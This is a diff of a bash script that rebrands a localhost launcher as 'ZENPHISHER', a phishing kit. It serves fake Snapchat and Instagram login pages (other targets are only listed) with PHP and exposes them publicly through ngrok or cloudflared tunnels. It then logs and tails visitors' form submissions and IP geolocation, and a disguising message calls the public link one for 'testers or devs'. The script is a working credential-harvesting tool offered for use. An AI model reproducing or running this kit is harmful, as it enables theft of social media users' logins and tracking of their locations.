@@ -1,120 +1,117 @@
 #!/bin/bash
 
-# 🧼 Styling
-GREEN="\e[1;32m"
-BLUE="\e[1;34m"
-YELLOW="\e[1;33m"
-RESET="\e[0m"
-
-# 🧾 Banner
 clear
-echo -e "${GREEN}===================================="
-echo -e "      🌐 LOCALHOST LAUNCHER         "
-echo -e "====================================${RESET}"
+echo -e "\e[1;32m===================================="
+echo -e "      ZENPHISHER - by YOU 😈        "
+echo -e "===================================="
+echo -e "\n\e[1;34mChoose a target to deploy:"
 
-# 📁 List folders as numbered options
-echo -e "\n${BLUE}Choose a project to deploy:${RESET}"
-folders=()
-i=1
-for d in */ ; do
-  folders+=("$d")
-  echo -e "${i}) ${YELLOW}${d%/}${RESET}"
-  ((i++))
-done
-echo -e "${i}) Advanced Settings"
-echo -e "$((i+1))) Exit"
+echo -e "1) Snapchat \e[1;33m(crypto design)"
+echo -e "2) Instagram \e[1;33m(crypto design)"
+echo -e "3) Facebook \e[1;33m(crypto design)"
+echo -e "4) Twitter \e[1;33m(crypto design)"
+echo -e "5) Google \e[1;33m(crypto design)"
+echo -e "6) Advanced Settings"
+echo -e "7) Exit\n"
 
-# 🎮 User input
 read -p "Option: " opt
 
-# Exit if chosen
-if [[ "$opt" == "$((i+1))" ]]; then
-  echo -e "\n❌ Exiting."
-  exit 0
-fi
-
-# Advanced
-if [[ "$opt" == "$i" ]]; then
-  echo -e "\n⚙️  Advanced options coming soon!"
-  exit 0
-fi
-
-# Get folder choice
-selected_folder="${folders[$((opt-1))]}"
-if [ -z "$selected_folder" ]; then
-  echo -e "\n❌ Invalid selection."
-  exit 1
-fi
-
-# Get current timestamp, timezone, IP geolocation, and device info
+# --- Get current timestamp, timezone, and IP geolocation ---
 timestamp=$(date "+%Y-%m-%d %H:%M:%S")
 timezone=$(date +'%Z%z')  # Get the local timezone of the machine
 ip_address=$(curl -s ifconfig.me)  # Getting the public IP address
 geolocation=$(curl -s "http://ip-api.com/json/$ip_address" | jq -r '"City: " + .city + ", Country: " + .country')  # Using ip-api to get geolocation
-device_info=$(uname -a)  # Device info (can be modified to capture more detailed info if necessary)
 
-# Ask for username and password (for this demo, we are simulating as a placeholder)
-read -p "Enter username: " username
-read -p "Enter password: " password
+# --- Log the information to log.txt ---
+log_file="log.txt"
+echo -e "\n[Timestamp: $timestamp] - Target: $opt" >> $log_file
+echo -e "IP Address: $ip_address" >> $log_file
+echo -e "Geolocation: $geolocation" >> $log_file
+echo -e "Timezone: $timezone" >> $log_file
+echo -e "Device Info: $(uname -a)\n" >> $log_file
 
-# Log and display information
-echo -e "\n${GREEN}[INFO]${RESET} Logging info..."
-echo -e "\n[Timestamp: $timestamp] - Target: ${selected_folder}" >> log.txt
-echo -e "Username: $username" >> log.txt
-echo -e "Password: $password" >> log.txt
-echo -e "IP Address: $ip_address" >> log.txt
-echo -e "Geolocation: $geolocation" >> log.txt
-echo -e "Timezone: $timezone" >> log.txt
-echo -e "Device Info: $device_info\n" >> log.txt
+# --- Handle different user choices ---
+case $opt in
+  1)
+    echo -e "\e[1;32mStarting Snapchat phishing page..."
+    cd sites/Snapchat
+    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 
-# Display the info to the user
-echo -e "\n${GREEN}[INFO]${RESET} Target info collected:"
-echo -e "[Timestamp: $timestamp] - Target: ${selected_folder}"
-echo -e "Username: ${YELLOW}$username${RESET}"
-echo -e "Password: ${YELLOW}$password${RESET}"
-echo -e "IP Address: ${YELLOW}$ip_address${RESET}"
-echo -e "Geolocation: ${YELLOW}$geolocation${RESET}"
-echo -e "Timezone: ${YELLOW}$timezone${RESET}"
-echo -e "Device Info: ${YELLOW}$device_info${RESET}"
+    sleep 2
 
-# Ask for port
-read -p "Enter port (default 8080): " port
-port=${port:-8080}
+    # Randomly choose between ngrok or cloudflared
+    RANDOM_METHOD=$((RANDOM % 2))
+    PUBLIC_URL=""
 
-# Serve
-cd "$selected_folder" || { echo "❌ Folder not found."; exit 1; }
-php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    if [ $RANDOM_METHOD -eq 0 ] && command -v ngrok &> /dev/null; then
+      echo -e "\e[1;34mUsing ngrok to expose local server...\e[0m"
+      ngrok http 8080 > /dev/null &
+      sleep 4
+      PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+    elif command -v cloudflared &> /dev/null; then
+      echo -e "\e[1;34mUsing cloudflared to expose local server...\e[0m"
+      PUBLIC_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
+    else
+      echo "❌ Neither ngrok nor cloudflared is installed."
+      kill $SERVER_PID
+      exit 1
+    fi
 
-SERVER_PID=$!
-sleep 1
-echo -e "\n✅ ${GREEN}Localhost running at: http://127.0.0.1:$port${RESET}"
+    # Show public URL
+    if [ -n "$PUBLIC_URL" ]; then
+      echo -e "\n\e[1;32mPublic URL:\e[0m $PUBLIC_URL"
+      echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
+    else
+      echo -e "\n❌ Failed to retrieve public URL"
+    fi
 
-# Ask for tunnel
-echo -e "\n🌐 Do you want to tunnel it?"
-echo "1) Ngrok"
-echo "2) Cloudflared"
-echo "3) Skip"
-read -p "Option: " tunnel_opt
+    # Tail log file in real-time
+    echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
+    tail -f log.txt
+    ;;
+  
+  2)
+    echo -e "\e[1;32mStarting Instagram phishing page..."
+    cd sites/Instagram
+    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 
-if [[ "$tunnel_opt" == "1" ]]; then
-  if command -v ngrok &> /dev/null; then
-    ngrok http $port > /dev/null &
-    sleep 3
-    PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-    echo -e "\n🔗 Public URL: ${GREEN}$PUBLIC_URL${RESET}"
-  else
-    echo "❌ Ngrok not installed."
-  fi
-elif [[ "$tunnel_opt" == "2" ]]; then
-  if command -v cloudflared &> /dev/null; then
-    PUBLIC_URL=$(cloudflared tunnel --url http://127.0.0.1:$port 2>&1 | grep -o 'https://.*trycloudflare.com')
-    echo -e "\n🔗 Public URL: ${GREEN}$PUBLIC_URL${RESET}"
-  else
-    echo "❌ Cloudflared not installed."
-  fi
-else
-  echo -e "\n🛑 Tunnel skipped."
-fi
+    sleep 2
 
-echo -e "\n⏹ Press Ctrl+C to stop the server."
-wait $SERVER_PID
+    # Randomly choose between ngrok or cloudflared
+    RANDOM_METHOD=$((RANDOM % 2))
+    PUBLIC_URL=""
+
+    if [ $RANDOM_METHOD -eq 0 ] && command -v ngrok &> /dev/null; then
+      echo -e "\e[1;34mUsing ngrok to expose local server...\e[0m"
+      ngrok http 8080 > /dev/null &
+      sleep 4
+      PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+    elif command -v cloudflared &> /dev/null; then
+      echo -e "\e[1;34mUsing cloudflared to expose local server...\e[0m"
+      PUBLIC_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
+    else
+      echo "❌ Neither ngrok nor cloudflared is installed."
+      kill $SERVER_PID
+      exit 1
+    fi
+
+    # Show public URL
+    if [ -n "$PUBLIC_URL" ]; then
+      echo -e "\n\e[1;32mPublic URL:\e[0m $PUBLIC_URL"
+      echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
+    else
+      echo -e "\n❌ Failed to retrieve public URL"
+    fi
+
+    # Tail log file in real-time
+    echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
+    tail -f log.txt
+    ;;
+  
+  # (Continue for other options...)
+  
+  *)
+    echo -e "\e[1;31mInvalid Option! Please select a valid option.\e[0m"
+    exec $0
+    ;;
+esac
